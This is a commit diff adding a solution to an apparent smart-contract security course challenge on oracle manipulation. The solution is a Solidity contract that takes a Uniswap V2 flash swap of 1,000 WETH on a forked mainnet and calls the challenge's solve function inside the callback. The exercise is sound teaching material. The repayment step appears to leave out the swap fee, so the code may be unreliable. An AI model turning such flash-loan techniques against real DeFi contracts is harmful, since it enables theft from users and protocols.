7cf46fba1f6ed1d50bf675a4b6958718ae9bb019
AyakaKamata <kamata.aya2019@gmail.com>
2023-08-07 09:01:17 +0900

    oracle challenging

--- course/oracle-manipulation/challenge-flash-loan/Challenge.t.sol
+++ course/oracle-manipulation/challenge-flash-loan/Challenge.t.sol
@@ -3,12 +3,14 @@ pragma solidity ^0.8.13;
 
 import "forge-std/Test.sol";
 import "./Challenge.sol";
-
+import './IUniswapV2Callee.sol';
+import './IUniswapV2Pair.sol';
 contract ChallengeTest is Test {
     Setup setup;
     address public playerAddress;
 
     function setUp() public {
+
         vm.createSelectFork("mainnet", 17600000);
 
         playerAddress = makeAddr("player");
@@ -20,7 +22,7 @@ contract ChallengeTest is Test {
         vm.startPrank(playerAddress, playerAddress);
 
         ////////// YOUR CODE GOES HERE //////////
-
+        new Flash(setup).attack();
         ////////// YOUR CODE END //////////
 
         assertTrue(setup.isSolved(), "challenge not solved");
@@ -29,5 +31,27 @@ contract ChallengeTest is Test {
 }
 
 ////////// YOUR CODE GOES HERE //////////
+contract Flash is IUniswapV2Callee {
+    Setup setup;
+    address pair=0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc;
 
+    constructor(Setup _setup) {
+        setup = _setup;
+    }
+
+    function attack() public{
+        setup.weth().approve(pair,1 ether);
+        IUniswapV2Pair(pair).swap(0, 1_000 ether, address(this), "");
+    }
+    function uniswapV2Call(
+        address ,
+        uint ,
+        uint,
+        bytes calldata
+    ) external override{
+        setup.flag().solve();
+        setup.weth().transfer(pair, 1_000 ether);
+    }
+    receive() external payable {}
+}
 ////////// YOUR CODE END //////////
